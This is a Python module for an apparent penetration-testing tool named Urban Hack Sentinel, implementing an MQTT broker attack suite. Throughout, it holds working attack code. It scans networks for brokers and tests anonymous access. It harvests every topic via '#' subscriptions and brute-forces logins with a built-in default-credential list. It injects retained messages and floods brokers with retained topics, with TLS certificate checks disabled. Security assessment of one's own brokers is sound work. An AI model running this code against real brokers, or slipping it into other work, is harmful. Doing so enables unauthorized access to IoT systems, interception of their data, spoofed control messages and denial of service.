"""
MQTT Attack Suite - Security testing for MQTT brokers.

Tests for:
- Unauthenticated broker access
- Topic enumeration (# wildcards)
- Message injection and replay
- Authentication bypass
- Weak credential brute force
- DoS via topic flooding
"""

import asyncio
import json
import os
import random
import structlog
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Callable, Set, TYPE_CHECKING

if TYPE_CHECKING:
    import paho.mqtt.client as mqtt

try:
    import paho.mqtt.client as mqtt
    PAHO_AVAILABLE = True
except ImportError:
    PAHO_AVAILABLE = False
    mqtt = None

from urban_hs.modules.network import NmapScanner, ScanType

logger = structlog.get_logger(__name__)


class MQTTAttackType(Enum):
    """Types of MQTT attacks."""
    BROKER_DISCOVERY = "broker_discovery"
    UNAUTH_ACCESS = "unauth_access"
    TOPIC_ENUMERATION = "topic_enumeration"
    CREDENTIAL_BRUTE_FORCE = "credential_brute_force"
    MESSAGE_INJECTION = "message_injection"
    TOPIC_FLOODING = "topic_flooding"
    SUBSCRIPTION_HIJACKING = "subscription_hijacking"
    WILL_MESSAGE_SPOOF = "will_message_spoof"
    ALL = "all"


@dataclass
class MQTTTarget:
    """MQTT broker target information."""
    host: str
    port: int = 1883
    use_tls: bool = False
    tls_verify: bool = True
    auth_required: bool = False
    discovered_at: datetime = field(default_factory=datetime.utcnow)
    topics: List[str] = field(default_factory=list)
    credentials: List[Dict[str, str]] = field(default_factory=list)
    version: str = "3.1.1"  # MQTT v3.1.1 or 5.0


@dataclass
class MQTTAttackResult:
    """Result of MQTT attack."""
    attack_type: str
    success: bool
    target: MQTTTarget
    message: str = ""
    error: Optional[str] = None
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.utcnow)


class MQTTAttackSuite:
    """
    MQTT Attack Suite for broker security testing.
    
    Performs comprehensive security testing on MQTT brokers:
    - Discovery via port scanning and DNS-SD/mDNS
    - Unauthenticated access testing
    - Topic enumeration (#, + wildcards)
    - Credential brute forcing
    - Message injection and manipulation
    - DoS via topic flooding
    """
    
    def __init__(
        self,
        output_dir: str = "/var/lib/urban-hs/mqtt_attacks",
        timeout: int = 30,
        scan_timeout: int = 60,
    ):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.scan_timeout = scan_timeout
        
        if not PAHO_AVAILABLE:
            logger.warning("paho-mqtt not installed. Install with: pip install paho-mqtt")
        
        self.nmap = NmapScanner()
        self.discovered_brokers: List[MQTTTarget] = []

    async def discover_brokers(
        self,
        targets: List[str] = None,
        ports: List[int] = None,
        callback: Optional[Callable[[str], None]] = None,
    ) -> List[MQTTTarget]:
        """
        Discover MQTT brokers via port scanning.
        
        Scans standard MQTT ports: 1883 (plain), 8883 (TLS), 8884 (TLS), 
        8885 (TLS), 8000, 8080
        """
        if not targets:
            targets = ["192.168.1.0/24"]
        
        if not ports:
            ports = [1883, 8883, 8884, 8885, 8000, 8080]
        
        brokers = []
        
        for target in targets:
            if callback:
                callback(f"Scanning {target} for MQTT brokers...")
            
            # Build port list for nmap
            port_str = ",".join(str(p) for p in ports)
            
            try:
                hosts = await self.nmap.scan(
                    target, 
                    ScanType.PORT_SCAN,
                    timeout=self.scan_timeout
                )
            except Exception as e:
                logger.warning("Nmap scan failed", target=target, error=str(e))
                continue
            
            # Look for open MQTT ports
            for host in hosts:
                for port_info in getattr(host, 'ports', []):
                    if port_info.get('port') in ports:
                        state = port_info.get('state', '')
                        if state == 'open':
                            broker = MQTTTarget(
                                host=host.address,
                                port=port_info['port'],
                                use_tls=port_info['port'] in [8883, 8884, 8885],
                            )
                            
                            # Try to identify the broker
                            broker_info = await self._probe_broker(broker)
                            broker.auth_required = broker_info.get('auth_required', False)
                            broker.version = broker_info.get('version', '3.1.1')
                            
                            brokers.append(broker)
                            self.discovered_brokers.append(broker)
                            
                            if callback:
                                callback(f"Found MQTT broker: {broker.host}:{broker.port} (TLS: {broker.use_tls})")
        
        return brokers

    async def _probe_broker(self, broker: MQTTTarget) -> Dict[str, Any]:
        """Probe broker for version and auth requirements."""
        if not PAHO_AVAILABLE or mqtt is None:
            return {"auth_required": True, "version": "unknown"}
        
        result = {"auth_required": True, "version": "3.1.1"}
        
        try:
            client = mqtt.Client(
                client_id=f"urban_hs_probe_{random.randint(1000,9999)}",
                protocol=mqtt.MQTTv311,
            )
            
            if broker.use_tls:
                client.tls_set(tls_version=2)
            
            connected = False
            
            def on_connect(c, u, f, rc):
                nonlocal connected
                connected = (rc == 0)
            
            client.on_connect = on_connect
            
            client.connect_async(broker.host, broker.port, keepalive=5)
            client.loop_start()
            
            await asyncio.sleep(3)
            client.loop_stop()
            
            if connected:
                result["auth_required"] = False
                result["version"] = "3.1.1"  # Could be 5.0
                client.disconnect()
            
        except Exception as e:
            logger.debug("Broker probe failed", host=broker.host, error=str(e))
        
        return result

    async def test_unauthenticated_access(
        self,
        broker: MQTTTarget,
        callback: Optional[Callable[[str], None]] = None,
    ) -> MQTTAttackResult:
        """Test if broker allows unauthenticated access."""
        if not PAHO_AVAILABLE or mqtt is None:
            return MQTTAttackResult(
                attack_type="unauth_access",
                success=False,
                target=broker,
                error="paho-mqtt not available",
            )
        
        connected = False
        
        def on_connect(c, u, f, rc):
            nonlocal connected
            connected = (rc == 0)
        
        try:
            client = mqtt.Client(
                client_id=f"urban_hs_test_{random.randint(10000,99999)}",
                protocol=mqtt.MQTTv311,
            )
            
            if broker.use_tls:
                client.tls_set(tls_version=2, cert_reqs=0)
            
            client.on_connect = on_connect
            
            client.connect_async(broker.host, broker.port, keepalive=10)
            client.loop_start()
            
            await asyncio.sleep(3)
            client.loop_stop()
            
            if connected:
                client.disconnect()
                return MQTTAttackResult(
                    attack_type="unauth_access",
                    success=True,
                    target=broker,
                    message=f"Unauthenticated access successful on {broker.host}:{broker.port}",
                    evidence={"port": broker.port, "tls": broker.use_tls},
                )
            
            return MQTTAttackResult(
                attack_type="unauth_access",
                success=False,
                target=broker,
                message="Unauthenticated access rejected",
            )
            
        except Exception as e:
            return MQTTAttackResult(
                attack_type="unauth_access",
                success=False,
                target=broker,
                error=str(e),
            )

    async def enumerate_topics(
        self,
        broker: MQTTTarget,
        callback: Optional[Callable[[str], None]] = None,
    ) -> MQTTAttackResult:
        """Enumerate topics using # wildcard subscriptions."""
        if not PAHO_AVAILABLE:
            return MQTTAttackResult(
                attack_type="topic_enumeration",
                success=False,
                target=broker,
                error="paho-mqtt not available",
            )
        
        if broker.auth_required:
            return MQTTAttackResult(
                attack_type="topic_enumeration",
                success=False,
                target=broker,
                message="Broker requires authentication, skipping enumeration",
            )
        
        discovered_topics: Set[str] = set()
        
        connected = False
        
        def on_message(client, userdata, msg):
            discovered_topics.add(msg.topic)
        
        def on_connect(c, u, f, rc):
            nonlocal connected
            if rc == 0:
                connected = True
                # Subscribe to # wildcard to get all topics
                c.subscribe("#", qos=0)
            else:
                connected = False
        
        try:
            client = mqtt.Client(
                client_id=f"urban_hs_enum_{random.randint(10000,99999)}",
                protocol=mqtt.MQTTv311,
            )
            
            if broker.use_tls:
                client.tls_set(tls_version=2, cert_reqs=0)
            
            client.on_connect = on_connect
            client.on_message = on_message
            
            client.connect_async(broker.host, broker.port, keepalive=30)
            client.loop_start()
            
            await asyncio.sleep(5)  # Wait for topic discovery
            client.loop_stop()
            
            if discovered_topics:
                # Store topics in broker object
                broker.topics = list(discovered_topics)
                
                return MQTTAttackResult(
                    attack_type="topic_enumeration",
                    success=True,
                    target=broker,
                    message=f"Discovered {len(discovered_topics)} topics",
                    evidence={"topics": list(discovered_topics), "count": len(discovered_topics)},
                )
            
            return MQTTAttackResult(
                attack_type="topic_enumeration",
                success=False,
                target=broker,
                message="No topics discovered",
            )
            
        except Exception as e:
            return MQTTAttackResult(
                attack_type="topic_enumeration",
                success=False,
                target=broker,
                error=str(e),
            )

    async def brute_force_credentials(
        self,
        broker: MQTTTarget,
        usernames: List[str] = None,
        passwords: List[str] = None,
        callback: Optional[Callable[[str], None]] = None,
    ) -> MQTTAttackResult:
        """Brute force MQTT credentials."""
        if not PAHO_AVAILABLE or mqtt is None:
            return MQTTAttackResult(
                attack_type="credential_brute_force",
                success=False,
                target=broker,
                error="paho-mqtt not available",
            )
        
        if not broker.auth_required:
            return MQTTAttackResult(
                attack_type="credential_brute_force",
                success=True,
                target=broker,
                message="No authentication required",
                evidence={"note": "Broker allows anonymous access"},
            )
        
        if not usernames:
            usernames = ["admin", "mqtt", "user", "guest", "root", "supervisor", "service", "iot", "device"]
        
        if not passwords:
            passwords = [
                "admin", "password", "123456", "mqtt", "public", "guest", ""
                "admin123", "mqtt123", "12345", "12345678", "changeme",
                "secret", "iot", "device", "sensor", "gateway",
            ]
        
        found_creds = []
        
        for username in usernames:
            for password in passwords:
                if callback:
                    callback(f"Trying {username}:{password}")
                
                try:
                    connected = False
                    
                    def on_connect(c, u, f, rc):
                        nonlocal connected
                        connected = (rc == 0)
                    
                    client = mqtt.Client(
                        client_id=f"urban_hs_bf_{random.randint(10000,99999)}",
                        protocol=mqtt.MQTTv311,
                    )
                    
                    client.username_pw_set(username, password)
                    
                    if broker.use_tls:
                        client.tls_set(tls_version=2, cert_reqs=0)
                    
                    connected = False
                    client.on_connect = on_connect
                    
                    client.connect_async(broker.host, broker.port, keepalive=10)
                    client.loop_start()
                    
                    await asyncio.sleep(2)
                    client.loop_stop()
                    
                    if connected:
                        found_creds.append({"username": username, "password": password})
                        client.disconnect()
                        
                except Exception:
                    pass
        
        if found_creds:
            broker.credentials = found_creds
            return MQTTAttackResult(
                attack_type="credential_brute_force",
                success=True,
                target=broker,
                message=f"Found {len(found_creds)} valid credential(s)",
                evidence={"credentials": found_creds},
            )
        
        return MQTTAttackResult(
            attack_type="credential_brute_force",
            success=False,
            target=broker,
            message="No valid credentials found",
        )

    async def inject_message(
        self,
        broker: MQTTTarget,
        topic: str,
        payload: str,
        qos: int = 0,
        retain: bool = False,
        callback: Optional[Callable[[str], None]] = None,
    ) -> MQTTAttackResult:
        """Inject a message into a topic."""
        if not PAHO_AVAILABLE or mqtt is None:
            return MQTTAttackResult(
                attack_type="message_injection",
                success=False,
                target=broker,
                error="paho-mqtt not available",
            )
        
        connected = False
        
        def on_connect(c, u, f, rc):
            nonlocal connected
            connected = (rc == 0)
        
        try:
            client = mqtt.Client(
                client_id=f"urban_hs_inject_{random.randint(10000,99999)}",
                protocol=mqtt.MQTTv311,
            )
            
            if broker.use_tls:
                client.tls_set(tls_version=2, cert_reqs=0)
            
            connected = False
            client.on_connect = on_connect
            
            client.connect_async(broker.host, broker.port, keepalive=30)
            client.loop_start()
            
            await asyncio.sleep(2)
            
            if not connected:
                client.loop_stop()
                return MQTTAttackResult(
                    attack_type="message_injection",
                    success=False,
                    target=broker,
                    message="Failed to connect to broker",
                )
            
            result = client.publish(topic, payload, qos=qos, retain=retain)
            
            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                client.loop_stop()
                return MQTTAttackResult(
                    attack_type="message_injection",
                    success=True,
                    target=broker,
                    message=f"Message injected to {topic}",
                    evidence={"topic": topic, "payload": payload, "qos": qos, "retain": retain},
                )
            
            client.loop_stop()
            return MQTTAttackResult(
                attack_type="message_injection",
                success=False,
                target=broker,
                message="Publish failed",
            )
            
        except Exception as e:
            return MQTTAttackResult(
                attack_type="message_injection",
                success=False,
                target=broker,
                error=str(e),
            )

    async def flood_topics(
        self,
        broker: MQTTTarget,
        count: int = 100,
        base_topic: str = "flood/test",
        callback: Optional[Callable[[str], None]] = None,
    ) -> MQTTAttackResult:
        """Flood broker with topic creations (DoS potential)."""
        if not PAHO_AVAILABLE or mqtt is None:
            return MQTTAttackResult(
                attack_type="topic_flooding",
                success=False,
                target=broker,
                error="paho-mqtt not available",
            )
        
        connected = False
        
        def on_connect(c, u, f, rc):
            nonlocal connected
            connected = (rc == 0)
        
        try:
            client = mqtt.Client(
                client_id=f"urban_hs_flood_{random.randint(10000,99999)}",
                protocol=mqtt.MQTTv311,
            )
            
            if broker.use_tls:
                client.tls_set(tls_version=2, cert_reqs=0)
            
            connected = False
            client.on_connect = on_connect
            
            client.connect_async(broker.host, broker.port, keepalive=30)
            client.loop_start()
            
            await asyncio.sleep(2)
            
            if not connected:
                client.loop_stop()
                return MQTTAttackResult(
                    attack_type="topic_flooding",
                    success=False,
                    target=broker,
                    message="Failed to connect",
                )
            
            sent = 0
            for i in range(count):
                topic = f"{base_topic}/{i}"
                payload = f"Flood message {i} at {datetime.utcnow().isoformat()}"
                
                result = client.publish(topic, payload, qos=0, retain=True)
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    sent += 1
                
                if i % 10 == 0:
                    await asyncio.sleep(0.01)
            
            client.loop_stop()
            
            return MQTTAttackResult(
                attack_type="topic_flooding",
                success=sent > 0,
                target=broker,
                message=f"Sent {sent}/{count} flood messages",
                evidence={"sent": sent, "total": count, "base_topic": base_topic},
            )
            
        except Exception as e:
            return MQTTAttackResult(
                attack_type="topic_flooding",
                success=False,
                target=broker,
                error=str(e),
            )

    async def run_full_assessment(
        self,
        target_network: str = "192.168.1.0/24",
        callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """Run full MQTT security assessment."""
        if callback:
            callback("Starting MQTT security assessment...")
        
        # Step 1: Discover brokers
        brokers = await self.discover_brokers([target_network], callback=callback)
        
        if not brokers:
            return {
                "brokers_found": 0,
                "overall": "No MQTT brokers discovered",
                "details": [],
            }
        
        assessment = {
            "brokers_found": len(brokers),
            "overall": "Assessment completed",
            "details": [],
        }
        
        for broker in brokers:
            broker_result = {
                "host": broker.host,
                "port": broker.port,
                "tls": broker.use_tls,
                "auth_required": broker.auth_required,
                "tests": {},
            }
            
            if callback:
                callback(f"Assessing broker {broker.host}:{broker.port}...")
            
            # Test unauth access
            if callback:
                callback(f"  Testing unauthenticated access...")
            result = await self.test_unauthenticated_access(broker)
            broker_result["tests"]["unauth_access"] = result.__dict__
            
            # Enumerate topics
            if callback:
                callback(f"  Enumerating topics...")
            result = await self.enumerate_topics(broker)
            broker_result["tests"]["topic_enumeration"] = result.__dict__
            
            # Brute force creds if auth required
            if broker.auth_required:
                if callback:
                    callback(f"  Brute forcing credentials...")
                result = await self.brute_force_credentials(broker)
                broker_result["tests"]["credential_brute_force"] = result.__dict__
            
            # Message injection test
            if callback:
                callback(f"  Testing message injection...")
            result = await self.inject_message(
                broker, 
                "test/urban_hs", 
                "test payload from Urban Hack Sentinel"
            )
            broker_result["tests"]["message_injection"] = result.__dict__
            
            if callback:
                callback(f"  Testing topic flooding (limited)...")
            result = await self.flood_topics(broker, count=10)
            broker_result["tests"]["topic_flooding"] = result.__dict__
            
            assessment["details"].append(broker_result)
        
        return assessment


# ============================================================
# Convenience Functions
# ============================================================

async def scan_mqtt_brokers(
    target: str = "192.168.1.0/24",
    ports: List[int] = None,
) -> List[MQTTTarget]:
    """Convenience function to scan for MQTT brokers."""
    suite = MQTTAttackSuite()
    return await suite.discover_brokers([target], ports)


async def test_mqtt_broker(
    host: str,
    port: int = 1883,
    use_tls: bool = False,
    test_all: bool = True,
) -> Dict[str, Any]:
    """Convenience function to test a single MQTT broker."""
    broker = MQTTTarget(host=host, port=port, use_tls=use_tls)
    suite = MQTTAttackSuite()
    
    results = {}
    
    if test_all:
        results["unauth_access"] = await suite.test_unauthenticated_access(broker)
        results["topic_enum"] = await suite.enumerate_topics(broker)
        
        if broker.auth_required:
            results["cred_brute"] = await suite.brute_force_credentials(broker)
        
        results["msg_inject"] = await suite.inject_message(broker, "test", "payload")
        results["flood"] = await suite.flood_topics(broker, count=5)
    
    return results


async def scan_and_assess_mqtt(
    target: str = "192.168.1.0/24",
    callback: Optional[Callable[[str], None]] = None,
) -> Dict[str, Any]:
    """Full MQTT scan and assessment."""
    suite = MQTTAttackSuite()
    return await suite.run_full_assessment(target, callback)


# ============================================================
# Exports
# ============================================================

__all__ = [
    "MQTTAttackType",
    "MQTTTarget",
    "MQTTAttackResult",
    "MQTTAttackSuite",
    "scan_mqtt_brokers",
    "test_mqtt_broker",
    "scan_and_assess_mqtt",
]